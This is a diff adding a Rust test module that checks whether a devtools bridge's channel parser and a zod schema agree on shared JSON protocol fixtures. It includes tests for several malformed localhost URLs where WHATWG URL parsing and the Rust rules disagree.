@@ -0,0 +1,317 @@
+// Story 055, task 16.1 (Rust half) — `channel.rs` gives every shared devtools-panel v2 fixture the
+// verdict zod gives it (zeo-devtools `test/contract-v2.test.ts`, task 2.1). Requirements: R2.1,
+// R5.1, R9.3 (Q14). Wired in `src/devtools_bridge.rs` as
+//
+//     #[cfg(test)]
+//     mod devtools_v2_contract_agreement_tests;
+//
+// Validation: `ZEO_DEVTOOLS_V2_CONTRACT_DIR=<abs>/zeo-devtools/test/contract/v2 cargo test -p
+// devtools_bridge contract_agreement`. The same filter also runs 045's
+// `browser_contract_agreement` (set `ZEO_BROWSER_CONTRACT_DIR` too), which is how "045's fixtures
+// still pass" is proved. Unset, each test here prints SKIPPED and returns; a set variable over a
+// missing or empty directory FAILS. Fixtures are never copied into the Zed tree.
+//
+// Fixture convention (shared with the vitest half): `client|server/{valid,invalid}/*.json`;
+// invalid files carry a top-level `"$expect"` (a ChannelError code), stripped first.
+// Scope: client fixtures get the full verdict and code (Zeo validates them). Server fixtures are
+// Zeo's OUTPUT: each valid one must deserialize and re-encode byte-equal as JSON; refusing invalid
+// server messages is the plugin's job (the vitest half).
+//
+// Hostile half: an invalid fixture that Rust ACCEPTS is a mismatch exactly like a valid one it
+// refuses — both directions are checked, and coverage of every new kind and code is required, so
+// a fixture set that silently lost the dev_server hello cannot pass.
+//
+// Refine v2 (2026-10-15), GOTCHA G14: WHATWG `URL` and Rust's rule disagree on an empty `?`, an
+// empty `#`, port 0, a tab, a backslash (refused by Rust) and an explicit `:80` (accepted). Each of
+// the five refused inputs must appear in its OWN invalid dev_server hello — a fixture carrying two
+// of them cannot tell which rule refused it — and get `bad_request` from Rust as its `$expect`
+// says; an explicit `:80` must appear in a valid one and be accepted. A fixture set that dropped
+// any of them, or a zod rule built on `new URL(...)`, fails here.
+
+use std::fs;
+use std::path::{Path, PathBuf};
+
+use serde_json::Value;
+
+use crate::channel::{ChannelError, ServerMsg, encode_server, parse_client};
+
+const ENV: &str = "ZEO_DEVTOOLS_V2_CONTRACT_DIR";
+
+fn contract_dir(test: &str) -> Option<PathBuf> {
+    match std::env::var_os(ENV) {
+        Some(dir) => Some(PathBuf::from(dir)),
+        None => {
+            eprintln!("SKIPPED {test}: {ENV} is unset; point it at zeo-devtools/test/contract/v2");
+            None
+        }
+    }
+}
+
+fn fixtures(dir: &Path) -> Vec<(PathBuf, Value, Option<String>)> {
+    let mut files: Vec<PathBuf> = fs::read_dir(dir)
+        .unwrap_or_else(|error| panic!("{} is readable: {error}", dir.display()))
+        .filter_map(|entry| entry.ok().map(|entry| entry.path()))
+        .filter(|path| path.extension().is_some_and(|ext| ext == "json"))
+        .collect();
+    files.sort();
+    assert!(
+        !files.is_empty(),
+        "{} holds no fixture: a set variable never passes on nothing",
+        dir.display()
+    );
+    files
+        .into_iter()
+        .map(|file| {
+            let text = fs::read_to_string(&file).expect("readable");
+            let mut value: Value =
+                serde_json::from_str(&text).unwrap_or_else(|e| panic!("{}: {e}", file.display()));
+            let expect = value
+                .as_object_mut()
+                .and_then(|object| object.remove("$expect"))
+                .and_then(|value| value.as_str().map(str::to_string));
+            (file, value, expect)
+        })
+        .collect()
+}
+
+fn code(error: &ChannelError) -> String {
+    match serde_json::to_value(error) {
+        Ok(Value::String(code)) => code,
+        other => panic!("ChannelError serializes to its code, got {other:?}"),
+    }
+}
+
+fn client_verdict(value: &Value) -> String {
+    let line = serde_json::to_vec(value).expect("json");
+    match parse_client(&line) {
+        Err(error) => code(&error),
+        Ok(_) => "accepted".to_string(),
+    }
+}
+
+#[test]
+fn contract_agreement_v2_client_valid_fixtures_are_accepted() {
+    let Some(dir) = contract_dir("contract_agreement_v2_client_valid_fixtures_are_accepted") else {
+        return;
+    };
+    let mut mismatches = Vec::new();
+    let all = fixtures(&dir.join("client/valid"));
+    for (file, value, _) in &all {
+        let verdict = client_verdict(value);
+        if verdict != "accepted" {
+            mismatches.push(format!(
+                "{}: zod accepts, Rust says {verdict}",
+                file.display()
+            ));
+        }
+    }
+    assert!(mismatches.is_empty(), "{}", mismatches.join("\n"));
+    let client_kinds: Vec<String> = all
+        .iter()
+        .filter(|(_, v, _)| v["kind"] == "hello")
+        .filter_map(|(_, v, _)| v["client"]["kind"].as_str().map(str::to_string))
+        .collect();
+    for kind in ["dev_server", "panel"] {
+        assert!(
+            client_kinds.iter().any(|k| k == kind),
+            "no valid hello with client kind {kind}"
+        );
+    }
+    assert!(
+        all.iter().any(|(_, v, _)| v["kind"] == "create_thread"),
+        "no valid create_thread"
+    );
+    // The amended URL rule on the wire: a Vite base path is valid.
+    assert!(
+        all.iter()
+            .any(|(_, v, _)| v["client"]["kind"] == "dev_server"
+                && v["client"]["app_url"]
+                    .as_str()
+                    .is_some_and(|u| u.splitn(4, '/').nth(3).is_some_and(|path| !path.is_empty()))),
+        "no valid dev_server hello whose app_url carries a base path"
+    );
+}
+
+#[test]
+fn contract_agreement_v2_client_invalid_fixtures_get_their_expected_code() {
+    let Some(dir) =
+        contract_dir("contract_agreement_v2_client_invalid_fixtures_get_their_expected_code")
+    else {
+        return;
+    };
+    let mut mismatches = Vec::new();
+    for (file, value, expect) in fixtures(&dir.join("client/invalid")) {
+        let expect = expect.unwrap_or_else(|| panic!("{} has no \"$expect\"", file.display()));
+        let verdict = client_verdict(&value);
+        if verdict != expect {
+            mismatches.push(format!(
+                "{}: expected {expect}, Rust says {verdict}",
+                file.display()
+            ));
+        }
+    }
+    assert!(mismatches.is_empty(), "{}", mismatches.join("\n"));
+}
+
+#[test]
+fn contract_agreement_v2_server_valid_fixtures_round_trip_and_cover_every_new_kind() {
+    let Some(dir) = contract_dir(
+        "contract_agreement_v2_server_valid_fixtures_round_trip_and_cover_every_new_kind",
+    ) else {
+        return;
+    };
+    let all = fixtures(&dir.join("server/valid"));
+    for (file, value, _) in &all {
+        let msg: ServerMsg = serde_json::from_value(value.clone())
+            .unwrap_or_else(|e| panic!("{}: Rust cannot read it: {e}", file.display()));
+        let line = encode_server(&msg)
+            .unwrap_or_else(|e| panic!("{}: Rust cannot write it: {e:?}", file.display()));
+        let back: Value = serde_json::from_str(line.trim_end()).expect("json line");
+        assert_eq!(&back, value, "{} round-trips", file.display());
+    }
+    for kind in ["created", "project_open", "project_closed"] {
+        assert!(
+            all.iter().any(|(_, v, _)| v["kind"] == kind),
+            "no valid server fixture of kind {kind}"
+        );
+    }
+    for error in ["not_found", "project_closed", "agent_start_failed"] {
+        assert!(
+            all.iter()
+                .any(|(_, v, _)| v["kind"] == "error" && v["error"] == error),
+            "no valid error fixture with code {error}"
+        );
+    }
+}
+
+// ---------------------------------------------------------------------------------------------
+// Refine v2 (2026-10-15): the G14 URL fixtures appear and agree.
+
+/// The `app_url` and `panel_url` of a dev_server hello; empty for any other message.
+fn dev_server_urls(value: &Value) -> Vec<&str> {
+    if value["kind"] != "hello" || value["client"]["kind"] != "dev_server" {
+        return Vec::new();
+    }
+    ["app_url", "panel_url"]
+        .into_iter()
+        .filter_map(|key| value["client"][key].as_str())
+        .collect()
+}
+
+/// The port written in `url`'s authority, if any: the text after the last `:` before the path.
+fn written_port(url: &str) -> Option<&str> {
+    let rest = url.get("http://".len()..)?;
+    let authority = rest.split('/').next()?;
+    authority.rsplit_once(':').map(|(_, port)| port)
+}
+
+fn has_empty_query(url: &str) -> bool {
+    url.find('?')
+        .is_some_and(|at| matches!(url[at + 1..].chars().next(), None | Some('#')))
+}
+
+/// The five inputs Rust refuses and `new URL(...)` accepts or rewrites.
+const G14_REFUSED: [(&str, fn(&str) -> bool); 5] = [
+    ("an empty `?`", has_empty_query),
+    ("an empty `#`", |url| url.ends_with('#')),
+    ("port 0", |url| {
+        written_port(url).is_some_and(|port| !port.is_empty() && port.bytes().all(|b| b == b'0'))
+    }),
+    ("a tab", |url| url.contains('\t')),
+    ("a backslash", |url| url.contains('\\')),
+];
+
+#[test]
+fn contract_agreement_v2_g14_url_fixtures_appear_and_agree() {
+    let Some(dir) = contract_dir("contract_agreement_v2_g14_url_fixtures_appear_and_agree") else {
+        return;
+    };
+    let invalid = fixtures(&dir.join("client/invalid"));
+    let mut problems = Vec::new();
+    for (what, _) in G14_REFUSED {
+        // Hostile half: only a fixture carrying THIS input and none of the other four isolates it.
+        let isolated: Vec<_> = invalid
+            .iter()
+            .filter(|(_, value, _)| {
+                let urls = dev_server_urls(value);
+                let hits: Vec<&str> = G14_REFUSED
+                    .iter()
+                    .filter(|(_, other)| urls.iter().any(|url| other(url)))
+                    .map(|(name, _)| *name)
+                    .collect();
+                hits == [what]
+            })
+            .collect();
+        if isolated.is_empty() {
+            problems.push(format!("no invalid dev_server hello carrying {what} alone"));
+        }
+        for (file, value, expect) in isolated {
+            let verdict = client_verdict(value);
+            if expect.as_deref() != Some("bad_request") || verdict != "bad_request" {
+                problems.push(format!(
+                    "{} ({what}): $expect {expect:?}, Rust says {verdict}; both must be bad_request",
+                    file.display()
+                ));
+            }
+        }
+    }
+
+    // Converse: an explicit `:80`, which `new URL(...)` drops, is a valid URL to both sides.
+    let explicit_80: Vec<_> = fixtures(&dir.join("client/valid"))
+        .into_iter()
+        .filter(|(_, value, _)| {
+            dev_server_urls(value)
+                .iter()
+                .any(|url| written_port(url) == Some("80"))
+        })
+        .collect();
+    if explicit_80.is_empty() {
+        problems.push("no valid dev_server hello whose URL carries an explicit :80".to_string());
+    }
+    for (file, value, _) in &explicit_80 {
+        let verdict = client_verdict(value);
+        if verdict != "accepted" {
+            problems.push(format!(
+                "{} (explicit :80): zod accepts, Rust says {verdict}",
+                file.display()
+            ));
+        }
+    }
+    assert!(problems.is_empty(), "{}", problems.join("\n"));
+}
+
+/// The predicates themselves, so a fixture that slips past them is the fixture's fault.
+#[test]
+fn contract_agreement_v2_g14_predicates_recognise_each_input() {
+    let cases = [
+        ("http://localhost:5173/?", "an empty `?`"),
+        ("http://localhost:5173/app/?#", "an empty `?`"),
+        ("http://localhost:5173/#", "an empty `#`"),
+        ("http://localhost:0", "port 0"),
+        ("http://127.0.0.1:0/app/", "port 0"),
+        ("http://local\thost:5173", "a tab"),
+        ("http://localhost:5173\\app", "a backslash"),
+    ];
+    for (url, expected) in cases {
+        let hits: Vec<&str> = G14_REFUSED
+            .iter()
+            .filter(|(_, matches)| matches(url))
+            .map(|(name, _)| *name)
+            .collect();
+        assert!(hits.contains(&expected), "{url:?} is {expected}: {hits:?}");
+    }
+    for url in [
+        "http://localhost:5173/app/",
+        "http://localhost:5173/?token=x",
+        "http://localhost:80/",
+        "http://localhost:8080",
+    ] {
+        assert!(
+            G14_REFUSED.iter().all(|(_, matches)| !matches(url)),
+            "{url:?} carries no G14 input"
+        );
+    }
+    assert_eq!(written_port("http://localhost:80/app/"), Some("80"));
+    assert_eq!(written_port("http://[::1]:80"), Some("80"));
+    assert_eq!(written_port("http://localhost:8080"), Some("8080"));
+}
